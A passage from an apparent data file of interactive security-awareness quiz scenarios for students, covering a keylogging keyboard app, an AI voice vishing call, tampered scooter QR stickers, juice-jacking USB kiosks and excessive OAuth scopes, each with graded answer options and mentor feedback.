          'You avoid catastrophic financial credential theft. On your cellular hotspot, the bank’s website loads with its genuine DigiCert certificate and valid padlock icon.',
        clueContext:
          'You respected browser cryptographic warnings and evacuated an actively intercepted network.',
      },
      {
        id: 'C',
        label: 'Refresh the page repeatedly to see if the certificate error clears itself.',
        description:
          'Reload the page several times hoping the network connection stabilizes.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'Refreshing keeps you connected to an intercepted network, allowing the proxy to continue mapping your open browser connections and attempting exploits.',
        clueContext:
          'A certificate authority failure on a major banking site is not a transient glitch; it indicates active interception.',
        saferAction: 'Disconnect from the network immediately.',
      },
      {
        id: 'D',
        label: 'Switch to another public open Wi-Fi network from the neighboring store and try again.',
        description:
          'Hop to an adjacent unencrypted shop network without enabling a VPN.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The neighboring open network may be run by the same attacker or suffer from identical wireless snooping.',
        clueContext:
          'Hopping between unverified public networks does not provide genuine security.',
        saferAction: 'Use personal cellular data or an encrypted VPN tunnel.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Browser certificate authority warnings on public networks signify active Machine-in-the-Middle interception. Never bypass SSL/TLS warnings on public Wi-Fi—disconnect and switch to a secure cellular connection.',
    learningObjective:
      'Interpret browser TLS certificate mismatch warnings and recognize active Machine-in-the-Middle decryption proxies on public networks.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Disastrous mistake: the browser gave you an explicit warning of active eavesdropping.',
        whyExplanation:
          'Bypassing an invalid certificate warning instructs your browser to transmit credentials through the attacker’s decryption proxy.',
        realisticOutcome:
          'The eavesdropper intercepted your bank credentials in plaintext and transferred your tuition money overseas.',
        clueInsight:
          'A major bank like Community Bank will never use an unverified local certificate issuer like `CoffeeNet-Proxy`.',
        saferAction: 'Treat invalid certificate warnings as active compromises.',
        principle: 'Never click past SSL/TLS certificate warnings on public Wi-Fi.',
      },
      B: {
        mentorVoice: 'Flawless analysis! You understood what the browser warning meant and acted decisively.',
        whyExplanation:
          'The browser halted the connection because an intermediary was trying to impersonate the bank’s cryptography.',
        realisticOutcome:
          'Switching to mobile hotspot established a genuine, verified TLS session directly with the bank’s authentic servers.',
        clueInsight:
          'The issuer string `CoffeeNet-Proxy-Inspection-CA` proved an unauthorized proxy was trying to break your encryption.',
        saferAction: 'Always prioritize personal cellular hotspot data for banking and sensitive work.',
        principle: 'Heed cryptographic warnings and evacuate compromised transport layers.',
      },
      C: {
        mentorVoice: 'Ineffective response: cryptographic interception does not resolve with a refresh.',
        whyExplanation:
          'The local router is actively routing traffic through its proxy server; refreshing simply repeats the compromised handshake.',
        realisticOutcome:
          'You wasted time while your machine remained visible to an active network attacker.',
        clueInsight:
          'Certificate authority errors are structural network indicators, not temporary loading lags.',
        saferAction: 'Disconnect immediately upon seeing TLS authority warnings.',
        principle: 'Do not treat cryptographic anomalies as minor connectivity glitches.',
      },
      D: {
        mentorVoice: 'Jumping from one fire into another: open networks lack verified security.',
        whyExplanation:
          'Unencrypted open Wi-Fi nearby is just as susceptible to ARP spoofing and DNS poisoning as the first cafe.',
        realisticOutcome:
          'The adjacent open network had similar security vulnerabilities, leaving your laptop exposed.',
        clueInsight:
          'Only personal cellular tethering or verified corporate VPNs provide reliable transport security.',
        saferAction: 'Use your phone’s cellular hotspot for reliable point-to-point encryption.',
        principle: 'Rely on personal cellular data over unknown public Wi-Fi networks.',
      },
    },
  },

  // 39 — Third-Party Keyboard App Full Access (App Permissions)
  {
    id: 'scenario-39',
    number: 39,
    code: 'OPS-39',
    title: 'The Custom Neon Emoji Keyboard App',
    category: 'passwords',
    categoryLabel: 'Mobile Keyloggers & Input Method Permissions',
    difficulty: 'Level 3 — Decide',
    environment: 'dorm',
    environmentTitle: 'Dorm Common Area',
    context: 'You see a viral social media post about a trending mobile keyboard with animated themes and AI autocorrect.',
    situation:
      'You download "NeonGlow AI Keyboard" to customize your phone’s keyboard appearance. In system settings, when enabling the keyboard, the operating system displays a stark full-screen modal: "Allow Full Access for NeonGlow Keyboard? Full access allows the developer to transmit anything you type, including credit card numbers, street addresses, and passwords, to their servers. This may also include previously typed text."',
    participant: {
      name: 'Samir Patel',
      role: 'Classmate',
      avatarType: 'student-casual',
    },
    dialogue: [
      'Whoa, did you read that system warning? It literally says the developer can log everything you type.',
      'The app description says full access is just to download neon color themes and update slang dictionaries.',
      'If you type your passwords and bank logins on that keyboard, does it send them to their cloud?',
    ],
    artifact: {
      type: 'cloud-permissions',
      title: 'Mobile OS Input Method Security Warning',
      subtitle: 'System Setting: Enable Third-Party Keyboard (Allow Full Access)',
      metadata: {
        PlatformWarning: 'OS-Level System Dialogue (Cannot be forged by developer)',
        Scope: 'Complete Keystroke Telemetry Across All Applications',
        NetworkRequirement: 'Unrestricted Internet Access for Third-Party Extension',
        PrivacyPolicyReview: 'Data stored on servers in jurisdictions with zero privacy regulations',
      },
      contentPreview:
        'Operating System Alert:\n"Warning: Third-party keyboards that request Full Access can record all keystrokes, including passwords, credit card numbers, and personal messages.\nAre you sure you want to allow full access for NeonGlow Keyboard?\n[ Allow Full Access ] [ Don\'t Allow ]"',
      clueCallout:
        'A keyboard with "Full Access" is structurally indistinguishable from a commercial keylogger. It has direct access to every character, password, security answer, and message entered across every app on the device.',
      tags: ['Third-Party Keyboard', 'Mobile Keylogger', 'Full Access Permission', 'Credential Interception'],
    },
    options: [
      {
        id: 'A',
        label: 'Tap "Allow Full Access" because the neon themes look great and the app has millions of downloads.',
        description:
          'Grant full access to enjoy custom themes, assuming popular app store apps are thoroughly vetted.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The keyboard logs every character you type, uploading your master passwords, two-factor backup codes, and private conversations to offshore ad and scraping servers.',
        clueContext:
          'You granted full keystroke interception privileges to an unverified third party for visual aesthetics.',
        saferAction: 'Never grant full access to third-party keyboards on devices used for sensitive accounts.',
      },
      {
        id: 'B',
        label: 'Tap "Don\'t Allow", uninstall the app, and stick with the secure native system keyboard.',
        description:
          'Reject full access, remove the app from your device, and rely on the operating system’s built-in, sandboxed keyboard.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your passwords, banking credentials, and private messages remain completely shielded within the protected OS sandbox.',
        clueContext:
          'You heeded the operating system’s explicit keylogger warning and avoided an invasive input vector.',
      },
      {
        id: 'C',
        label: 'Grant full access, but promise yourself to manually switch back to the stock keyboard when typing passwords.',
        description:
          'Rely on memory to toggle keyboards every time a password or credit card field appears.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'You inevitably forget to switch during rapid logins or autofill prompts, exposing several accounts and sensitive private messages to the keyboard developer.',
        clueContext:
          'Human memory is unreliable for continuous security switches during daily phone use.',
        saferAction: 'Uninstall the overreaching keyboard entirely.',
      },
      {
        id: 'D',
        label: 'Allow full access, but disable cellular data for the app in phone settings.',
        description:
          'Attempt to block internet access over cellular while still using the keyboard.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The keyboard caches keystroke logs locally and uploads them whenever your phone connects to Wi-Fi.',
        clueContext:
          'Restricting cellular data does not prevent data exfiltration over wireless networks.',
        saferAction: 'Refuse full access at the permission layer.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Third-party keyboards with full network access function as keyloggers. Input methods process every credential and message on your device—never compromise input security for visual novelties.',
    learningObjective:
      'Understand the profound risks of third-party input method permissions and resist visual gimmicks that compromise core keystroke confidentiality.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Severe security compromise: you handed an unknown developer a personal keylogger.',
        whyExplanation:
          'A keyboard with full access captures every keystroke: banking passwords, student ID numbers, and private text chats.',
        realisticOutcome:
          'Your passwords appeared in a breached credential dump six weeks later, linked directly to the keyboard app’s compromised database.',
        clueInsight:
          'The OS modal warning explicitly spelled out the catastrophic risk of granting full access.',
        saferAction: 'Keep to native, first-party keyboards provided by the operating system vendor.',
        principle: 'Never authorize third-party network access to primary input devices.',
      },
      B: {
        mentorVoice: 'Wise decision! You prioritized keystroke confidentiality over visual gimmicks.',
        whyExplanation:
          'Native iOS and Android keyboards do not transmit raw keystroke feeds to third-party monetization servers.',
        realisticOutcome:
          'Your credentials remained 100% confidential, and your phone avoided background battery drain from telemetry tracking.',
        clueInsight:
          'The operating system displays those severe warnings for a reason—keyboards are high-value targets for spyware.',
        saferAction: 'Always use built-in system input methods for critical credential entry.',
        principle: 'Protect the integrity of the primary input stream.',
      },
      C: {
        mentorVoice: 'Fragile defense: relying on memory for continuous security fails quickly.',
        whyExplanation:
          'A single moment of distraction or an unexpected password popup leads to catastrophic credential leakage.',
        realisticOutcome:
          'You forgot to switch keyboards while logging into your student loan portal, exposing your master password.',
        clueInsight:
          'Security architecture must be robust against human fatigue, not reliant on manual toggles.',
        saferAction: 'Remove risky keyboards entirely rather than attempting selective use.',
        principle: 'Eliminate systemic risks rather than relying on manual procedural vigilance.',
      },
      D: {
        mentorVoice: 'Incomplete block: keyboards sync over Wi-Fi as soon as you connect.',
        whyExplanation:
          'Disabling cellular data leaves Wi-Fi completely open, allowing the app to dump its keystroke buffer the moment you walk into your dorm.',
        realisticOutcome:
          'The app quietly transmitted all cached keystrokes as soon as your phone joined the campus Wi-Fi network.',
        clueInsight:
          'Data brokers design apps to queue logs offline until unrestricted connectivity is detected.',
        saferAction: 'Deny the permission at the system prompt.',
        principle: 'Gating transport channels does not replace denying root permissions.',
      },
    },
  },

  // 40 — AI Voice Assistant Bank Fraud Callback (AI Impersonation)
  {
    id: 'scenario-40',
    number: 40,
    code: 'OPS-40',
    title: 'The AI Synthetic Bank Fraud Specialist',
    category: 'social-engineering',
    categoryLabel: 'Conversational AI Voice Bots & Vishing Infiltration',
    difficulty: 'Level 4 — Respond',
    environment: 'dorm',
    environmentTitle: 'Dorm Room Study Desk',
    context: 'You are studying for an exam when your phone rings from a number matching your bank’s customer service line.',
    situation:
      'An automated voice that sounds remarkably fluid, polite, and human introduces itself: "Hello, this is Sarah from the First National Fraud Prevention Automated Rapid Response Unit. We have detected three suspicious transactions totaling $412.50 originating from a device in Manchester, UK. To cancel these charges and block unauthorized access, our automated voice verification protocol requires you to speak your six-digit mobile banking PIN or say your mother’s maiden name now."',
    participant: {
      name: 'Maya Chen',
      role: 'Roommate',
      avatarType: 'dorm-roommate',
    },
    dialogue: [
      'Who is calling you? The voice sounds like a high-end AI assistant like Siri or Gemini.',
      'Did it just ask you to speak your mobile banking PIN out loud?!',
      'Caller ID can be spoofed in two seconds online. Hang up and check your real banking app.',
    ],
    artifact: {
      type: 'chat-message',
      title: 'Incoming Call Telemetry & Caller ID Inspection',
      subtitle: 'Telephony Channel: Spoofed Inbound VoIP Call',
      metadata: {
        CallerID: 'First National Bank Fraud Line (1-800-555-0199)',
        VoicePattern: 'Neural Text-to-Speech (Zero Breaths, Latency Invariance, Instant Dynamic Response)',
        DataDemanded: 'Spoken Account PIN / Security Questions',
        LegitimatePolicy: 'Banks NEVER ask for account PINs or passwords on inbound or outbound calls.',
      },
      contentPreview:
        'Caller Audio Analysis:\n"Sarah (AI Voice)": "I understand your concern, Alex. For your safety, the account is temporarily frozen. I just need you to speak your 6-digit PIN so I can authorize the charge reversal and issue you a new debit card right now."',
      clueCallout:
        'Conversational AI agents (vishing bots) now conduct full real-time phone calls with dynamic responses. Caller ID numbers are trivially spoofed. Financial institutions NEVER solicit debit PINs, online passwords, or full Social Security numbers over the phone.',
      tags: ['AI Voice Bot', 'Caller ID Spoofing', 'PIN Harvesting', 'Vishing'],
    },
    options: [
      {
        id: 'A',
        label: 'Speak your PIN clearly into the phone so the automated system can cancel the fraudulent charges.',
        description:
          'Follow the automated voice prompts to protect your money from the UK transactions.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The AI bot captures your PIN and immediately drains your checking account through an ATM network integration, while the supposed "UK charges" were completely fictitious.',
        clueContext:
          'You surrendered your confidential debit PIN to an unverified inbound caller.',
        saferAction: 'Never disclose account PINs to anyone, including bank representatives or automated bots.',
      },
      {
        id: 'B',
        label: 'Hang up immediately, open your official mobile banking app, or dial the number on the back of your card.',
        description:
          'Terminate the call without providing any data, log into your verified banking app to check transactions, and call customer service using the trusted number printed on your debit card.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your banking app confirms there are no pending UK charges. The real bank fraud unit logs the spoofed vishing attempt, and your account remains 100% secure.',
        clueContext:
          'You recognized that caller ID is easily spoofed and executed verified out-of-band communication.',
      },
      {
        id: 'C',
        label: 'Ask the bot for its employee badge number and supervisor name before speaking the PIN.',
        description:
          'Attempt to interrogate the voice bot to verify its corporate credentials.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The LLM backend dynamically fabricates convincing employee IDs and supervisor names in seconds, giving you false reassurance to proceed with giving up your data.',
        clueContext:
          'AI voice agents can hallucinate or generate realistic corporate credentials instantly.',
        saferAction: 'Hang up and initiate an outbound call to the number on your physical debit card.',
      },
      {
        id: 'D',
        label: 'Stay on the line and press 0 repeatedly to transfer to a human manager.',
        description:
          'Bypass the bot to speak with a human employee.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The call is routed to a human scammer in an offshore call center who doubles down on the urgency and demands your card details.',
        clueContext:
          'The entire phone infrastructure is operated by criminals; pressing 0 just transfers you to human scammers.',
        saferAction: 'Sever the connection immediately.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Inbound Caller ID is easily forged. Financial institutions will never call you and ask for your PIN, master password, or one-time passcode. Always hang up and dial the official phone number printed on the back of your physical card.',
    learningObjective:
      'Recognize automated conversational AI vishing bots and execute out-of-band verification using contact information on official physical payment cards.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Critical security error: you gave your secret PIN to an automated criminal bot.',
        whyExplanation:
          'Banks never solicit debit PINs or passwords. Caller ID is untrusted metadata easily forged with VoIP software.',
        realisticOutcome:
          'Scammers cloned your debit card credentials and emptied your checking account at an ATM ten minutes later.',
        clueInsight:
          'The request for a confidential PIN is an absolute, non-negotiable indicator of fraud.',
        saferAction: 'Never speak or type your PIN for any inbound telephone call.',
        principle: 'Confidential authentication PINs are known only to you; banks never ask for them.',
      },
      B: {
        mentorVoice: 'Flawless response! You rejected the urgency and used verified out-of-band verification.',
        whyExplanation:
          'Hanging up and calling the number on your physical card guarantees you are speaking with your actual bank.',
        realisticOutcome:
          'Your account was completely safe, and your report helped the bank flag the spoofed caller ID number with telecom carriers.',
        clueInsight:
          'The seamless, breath-free cadence of the voice bot combined with the request for a PIN confirmed the vishing attack.',
        saferAction: 'Always use the phone number printed on your physical card.',
        principle: 'Verify incoming financial alerts by initiating outbound calls to trusted numbers.',
      },
      C: {
        mentorVoice: 'Conversational traps: AI models easily generate believable badge numbers.',
        whyExplanation:
          'Interrogating a conversational AI bot only provides it more conversational turns to convince you.',
        realisticOutcome:
          'The bot provided realistic-sounding credentials ("Badge #FN-8839, Supervisor Marcus Vance"), convincing you to share your PIN.',
        clueInsight:
          'Anyone can make up an ID number; procedural verification requires an independent communication channel.',
        saferAction: 'End the call immediately without engaging in debate.',
        principle: 'Do not attempt to authenticate a caller through the same unverified call.',
      },
      D: {
        mentorVoice: 'The entire call is a hostile environment; transfers lead to human accomplices.',
        whyExplanation:
          'Transferring within a scam call just routes you to an aggressive human fraudster trained in high-pressure tactics.',
        realisticOutcome:
          'The human operator berated you for hesitating and threatened to freeze your credit unless you gave up your PIN.',
        clueInsight:
          'The call itself was fraudulent from the beginning; pressing buttons does not connect you to a legitimate bank.',
        saferAction: 'Hang up and dial the trusted number on your card.',
        principle: 'Do not navigate caller menus on suspicious inbound phone calls.',
      },
    },
  },

  // 41 — Electric Scooter Rental QR Decal Tamper (QR Scam)
  {
    id: 'scenario-41',
    number: 41,
    code: 'OPS-41',
    title: 'The Electric Scooter Rental QR Decal',
    category: 'qr',
    categoryLabel: 'Physical Quishing & Mobile Micropayment Decals',
    difficulty: 'Level 2 — Investigate',
    environment: 'quad',
    environmentTitle: 'Campus Bike & Scooter Station',
    context: 'You are running late for a lecture across campus and need to unlock a shared electric scooter.',
    situation:
      'You walk up to a campus scooter rack. On the handlebar of scooter #408, there is a QR code decal. Looking closely, the decal feels thick, and one corner is peeling up, revealing parts of another printed QR code underneath. When scanned with your camera app, the URL preview displays: `unlock-scooter-ride-fast.site/unlock?id=408`. The official campus scooter fleet uses the brand "CampusGlide" with app domains ending in `.campusglide.edu`.',
    participant: {
      name: 'Jordan Rivera',
      role: 'Classmate Running Late',
      avatarType: 'student-worried',
    },
    dialogue: [
      'Hurry up and scan it, class starts in five minutes!',
      'Wait, why does the QR code on this scooter look like a thick sticker stuck over another one?',
      'Does CampusGlide use `.site` web domains, or do we normally unlock these inside their official app?',
    ],
    artifact: {
      type: 'qr-poster',
      title: 'Physical Decal & Domain Comparison Audit',
      subtitle: 'Hardware: Shared Micromobility Fleet Scooter',
      metadata: {
        ObservedSticker: 'Thick vinyl adhesive sticker applied over original anodized aluminum plate',
        ScannedDestination: 'https://unlock-scooter-ride-fast.site/unlock?id=408',
        OfficialFleetApp: 'CampusGlide Mobile App (Deep Link: campusglide://unlock/408)',
        OfficialDomain: 'https://fleet.campusglide.edu',
      },
      contentPreview:
        'Mobile Landing Page Preview:\n"QUICK UNLOCK: Enter credit card for $1.00 unlock fee + $0.15/min.\n*Note: Apple Pay / Google Pay unavailable; enter physical card number directly below to activate throttle.*"',
      clueCallout:
        'Pasting malicious stickers over scooter and bike-share barcodes is a widespread urban quishing scam. Legitimate micromobility services open directly inside their native app, never through third-party `.site` web checkout forms that reject secure mobile wallets.',
      tags: ['Scooter Quishing', 'Decal Tampering', 'Micromobility Fraud'],
    },
    options: [
      {
        id: 'A',
        label: 'Enter your card on the website quickly to unlock the scooter and make it to class on time.',
        description:
          'Submit your payment details on the mobile web page to avoid walking across campus.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The scooter never unlocks because the site has no connection to the fleet system. Your card is charged recurring fraudulent fees, and you still end up arriving late to class.',
        clueContext:
          'You entered payment information into an unverified `.site` domain through a pasted sticker.',
        saferAction: 'Only unlock fleet vehicles from within the official verified application.',
      },
      {
        id: 'B',
        label: 'Open the official CampusGlide app directly and enter the scooter’s 4-digit ID number manually.',
        description:
          'Ignore the tampered QR sticker, launch the verified campus app, and type in ID #408 directly into the app’s manual entry interface.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'The scooter unlocks smoothly through the authentic encrypted app connection, keeping your payment data safe. You report the tampered sticker to campus transportation services.',
        clueContext:
          'You bypassed the compromised physical decal and utilized the verified mobile app with manual ID entry.',
      },
      {
        id: 'C',
        label: 'Peel off the fake sticker and scan the damaged original QR code underneath.',
        description:
          'Try to rip the top sticker off to get to the real barcode.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'Peeling tears both stickers, making the barcode unreadable and leaving sticky residue that damages the kiosk scanner.',
        clueContext:
          'Physical removal without fleet tools often damages the underlying legitimate QR code.',
        saferAction: 'Use the official app and type the visible vehicle number manually.',
      },
      {
        id: 'D',
        label: 'Try scanning a different scooter nearby without checking if its QR code is also a sticker.',
        description:
          'Walk to the next scooter and immediately scan it in a rush.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'Organized sticker crews typically hit all scooters in a single rack, so the adjacent scooter may harbor an identical fake sticker.',
        clueContext:
          'Physical quishing campaigns target entire clusters of shared equipment simultaneously.',
        saferAction: 'Check for physical tampering and rely on the official app.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Shared urban mobility hardware is highly vulnerable to physical QR decal tampering. Always unlock shared scooters and bikes from inside the official native app, using manual vehicle ID entry when stickers look suspicious.',
    learningObjective:
      'Identify physical decal tampering on micromobility fleets and utilize secure manual vehicle ID entry in native apps.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'High-risk trap: the scooter will not unlock and your card is stolen.',
        whyExplanation:
          'The fake sticker connects to a criminal payment skimmer, not the vehicle’s telemetry controller.',
        realisticOutcome:
          'You were stranded on the sidewalk with a locked scooter and a compromised credit card.',
        clueInsight:
          'The requirement to enter raw card details rather than using Apple/Google Pay in the official app was a major red flag.',
        saferAction: 'Never use web checkout links to unlock shared mobility equipment.',
        principle: 'Only transact through official installed micromobility apps.',
      },
      B: {
        mentorVoice: 'Smart tradecraft! Manual ID entry inside the official app completely neutralizes the sticker scam.',
        whyExplanation:
          'Using the vehicle ID inside the authentic app bypasses the physical QR vector entirely while maintaining end-to-end security.',
        realisticOutcome:
          'The scooter activated immediately, your payment was processed securely, and you arrived at class on time.',
        clueInsight:
          'Every legitimate rental scooter has an alphanumeric ID number painted or etched on the frame for manual input.',
        saferAction: 'Use manual numeric entry whenever QR codes appear modified.',
        principle: 'Bypass compromised physical vectors using verified application channels.',
      },
      C: {
        mentorVoice: 'Good intention, but physical damage leaves the vehicle unusable.',
        whyExplanation:
          'Tearing stickers often shreds the printed barcode underneath, preventing your camera from reading it anyway.',
        realisticOutcome:
          'The barcode was ruined, forcing you to find another scooter while running late.',
        clueInsight:
          'Manual ID entry inside the app is faster and cleaner than attempting physical repairs.',
        saferAction: 'Type the 4-digit vehicle ID into the app.',
        principle: 'Prefer digital workarounds over destructive physical manipulation.',
      },
      D: {
        mentorVoice: 'Hasty assumption: scammers rarely tamper with just one scooter.',
        whyExplanation:
          'Sticker crews systematically walk down entire rows of bikes and scooters pasting overlays on every single unit.',
        realisticOutcome:
          'The adjacent scooter had the exact same sticker, leaving you at risk of scanning another trap.',
        clueInsight:
          'Treat an entire cluster of hardware as potentially tampered if one unit shows signs of decal overlay.',
        saferAction: 'Inspect the sticker on the second scooter or use manual entry.',
        principle: 'Assume systemic tampering across clustered public equipment.',
      },
    },
  },

  // 42 — Free Charging Kiosk Juice Jacking (Hardware & Public Safety)
  {
    id: 'scenario-42',
    number: 42,
    code: 'OPS-42',
    title: 'The Train Station "Rapid Charge" USB Port',
    category: 'hardware',
    categoryLabel: 'Hardware Exploitation & Mobile Data Pair Hijacking',
    difficulty: 'Level 3 — Decide',
    environment: 'quad',
    environmentTitle: 'Intercity Transit Hub',
    context: 'Your phone battery is at 4% while waiting for an evening train.',
    situation:
      'You spot a public charging kiosk with various raw USB-A and USB-C ports labeled "FREE 65W RAPID DEVICE CHARGING". You plug your smartphone directly into one of the open USB-A ports using your regular charging cord. Within three seconds, your phone screen wakes up with an unexpected operating system modal: "Trust This Computer? Your settings and data will be accessible from this computer when paired. [ Trust ] [ Don\'t Trust ]."',
    participant: {
      name: 'Elena Rostova',
      role: 'Infosec Lab Proctor',
      avatarType: 'lab-proctor',
    },
    dialogue: [
      'Stop! Look at your phone screen right now!',
      'Why is a "charging station" asking if you trust a computer?!',
      'Power outlets only carry electricity over pins 1 and 4. A prompt asking to trust a computer means data pins 2 and 3 are actively connected to a hidden host computer.',
    ],
    artifact: {
      type: 'usb-device',
      title: 'USB Pinout & Host Negotiation Telemetry',
      subtitle: 'Port: USB 3.1 Type-A Kiosk Terminal #04',
      metadata: {
        PowerPins: 'VBUS (5V, 2.4A) & GND — Active Power Delivery',
        DataPins: 'D+ and D- Data Lines (Active USB Host Controller Detected: Linux 6.2 Host Daemon)',
        TargetOSPrompt: '"Trust This Computer? (Allows MTP / File Access / Debugging)"',
        RiskCategory: 'Juice Jacking / Unauthorized Host Pairing',
      },
      contentPreview:
        'OS Trust Dialog:\n"Trust This Computer?\nYour settings and data will be accessible from this computer when paired.\n[ Trust ] [ Don\'t Trust ]\nEnter Passcode to Trust."',
      clueCallout:
        'Pure power delivery never requires host trust pairing. If a public charging cable or port prompts "Trust This Computer", a hidden data host is attempting to mount your filesystem, access media, or enable ADB/debugging diagnostics (Juice Jacking).',
      tags: ['Juice Jacking', 'Data Pairing', 'USB Data Pins', 'Public Kiosk'],
    },
    options: [
      {
        id: 'A',
        label: 'Tap "Trust" and enter your device passcode to enable fast charging.',
        description:
          'Agree to the prompt assuming trust is required for high-wattage power protocols.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The hidden kiosk computer mounts your mobile filesystem, silently extracting your unencrypted photo library, offline cached documents, and device backup metadata before you unplug.',
        clueContext:
          'You granted full data-pairing permissions to an untrusted public USB host controller.',
        saferAction: 'Never tap "Trust This Computer" when connecting to public charging stations.',
      },
      {
        id: 'B',
        label: 'Immediately tap "Don\'t Trust", unplug your cable, and use an AC wall outlet or portable power bank.',
        description:
          'Refuse the pairing request, disconnect from the compromised USB port, and charge via your own AC power adapter in an electrical wall socket.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Zero data is exchanged. By plugging your AC adapter into a standard 120V wall socket, your phone receives pure electrical power with zero possibility of data extraction.',
        clueContext:
          'You recognized that power delivery does not require data trust and switched to an isolated AC source.',
      },
      {
        id: 'C',
        label: 'Tap "Trust", but quickly lock your phone screen hoping it blocks file transfers.',
        description:
          'Accept the prompt and immediately lock the screen to prevent access.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'Once a host is trusted with your passcode, locking the screen does not terminate the authenticated pairing session, allowing continuous background data sync.',
        clueContext:
          'Pairing keys persist across screen lock cycles until explicitly forgotten or revoked.',
        saferAction: 'Reject pairing completely; do not authorize untrusted hosts.',
      },
      {
        id: 'D',
        label: 'Leave it plugged in, but enable Airplane Mode to block network transmissions.',
        description:
          'Turn on airplane mode while remaining connected to the USB port.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'Airplane mode shuts down wireless antennas, but does nothing to block physical wired USB data transmission through the cable.',
        clueContext:
          'Airplane mode only controls wireless radios; USB data pins remain fully connected.',
        saferAction: 'Physically unplug the cable from the untrusted USB receptacle.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Electrical charging never requires data trust pairing. Never connect personal devices directly into public raw USB receptacles without a USB data blocker ("USB condom"), and always prefer dedicated AC wall power adapters.',
    learningObjective:
      'Recognize Juice Jacking indicators on public USB charging infrastructure and understand the vital distinction between electrical power and host data pairing.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Severe security breach: you authorized a public computer to inspect your phone.',
        whyExplanation:
          'Tapping "Trust" gives the host operating system permission to mount your storage, sync photos, and read backups.',
        realisticOutcome:
          'A concealed micro-PC inside the charging station downloaded your personal photos and browser cache.',
        clueInsight:
          'Fast charging protocols (USB-PD / QC) negotiate voltage through hardware chips, never via OS-level "Trust This Computer" prompts.',
        saferAction: 'Always tap "Don\'t Trust" and unplug immediately.',
        principle: 'Never authorize data trust relationships with public charging hardware.',
      },
      B: {
        mentorVoice: 'Excellent physical security tradecraft! You recognized the data pairing threat.',
        whyExplanation:
          'Plugging into a regular AC power socket with your own adapter guarantees that only electricity travels into your battery.',
        realisticOutcome:
          'Your battery charged safely to 50% using a standard wall outlet with zero risk to your confidential files.',
        clueInsight:
          'The prompt "Trust This Computer" is absolute proof that data pins are active and connected to an endpoint.',
        saferAction: 'Carry a portable power bank or a hardware USB data blocker when traveling.',
        principle: 'Isolate power delivery from data channels in public spaces.',
      },
      C: {
        mentorVoice: 'Misunderstanding trust pairing: the trust relationship persists while locked.',
        whyExplanation:
          'Entering your passcode creates an authorized cryptographic pairing record that remains open while plugged in.',
        realisticOutcome:
          'The hidden kiosk host continued extracting device logs and media despite your locked screen.',
        clueInsight:
          'Screen lock only stops touch input; it does not sever established USB host pairings.',
        saferAction: 'Decline the prompt and remove the cable.',
        principle: 'Trusting a host grants persistent background data access.',
      },
      D: {
        mentorVoice: 'Wireless toggles do not stop wired hardware data extraction.',
        whyExplanation:
          'Airplane mode disables Wi-Fi, Bluetooth, and cellular radios, but wired USB bus communication is unaffected.',
        realisticOutcome:
          'The kiosk computer continued communicating over the copper USB data wires.',
        clueInsight:
          'Physical wired connections operate independently of wireless radio status.',
        saferAction: 'Unplug the physical cable immediately.',
        principle: 'Wireless flight modes have no effect on physical wired USB interfaces.',
      },
    },
  },

  // 43 — Health App Third-Party Cloud Scope Overreach (App Permissions)
  {
    id: 'scenario-43',
    number: 43,
    code: 'OPS-43',
    title: 'The Third-Party Fitness Tracker OAuth Grant',
    category: 'privacy',
    categoryLabel: 'OAuth Consent Scope Overreach & Health Privacy',
    difficulty: 'Level 3 — Decide',
    environment: 'quad',
    environmentTitle: 'Campus Recreation Center',
    context: 'You sign up for a student marathon training group at the campus gym.',
    situation:
      'A fellow student recommends a third-party workout analytics web app: "KudoSprint Analytics". When you click "Connect with Google / Apple", an official consent screen appears from your identity provider. However, the requested permission scopes include: "1. View your basic profile, 2. Read and write all historical Apple Health / Google Fit biometric data (Heart rate, Sleep, Blood oxygen), 3. See, edit, create, and delete all your Google Drive files, and 4. Read your calendar events."',
    participant: {
      name: 'Samir Patel',
      role: 'Marathon Training Partner',
      avatarType: 'student-casual',
    },
    dialogue: [
      'Did you connect your fitness app to KudoSprint yet? It shows pace graphs.',
      'Wait, why is a running app asking for permission to read and delete all your Google Drive files?',
      'Is that normal for workout trackers, or is that completely excessive?',
    ],
    artifact: {
      type: 'cloud-permissions',
      title: 'OAuth 2.0 Consent Screen Scope Analysis',
      subtitle: 'Application: KudoSprint Analytics (Developer: Unverified Independent)',
      metadata: {
        LegitimateScope: 'fitness.activity.read (Activity and Pace Analytics)',
        OverreachingScope1: 'drive (Full Read, Edit, and Delete Access to Entire Cloud Drive)',
        OverreachingScope2: 'calendar.readonly (Access to All Personal and Academic Schedules)',
        ClientStatus: 'Unverified Developer (Has not completed Google App Verification)',
      },
      contentPreview:
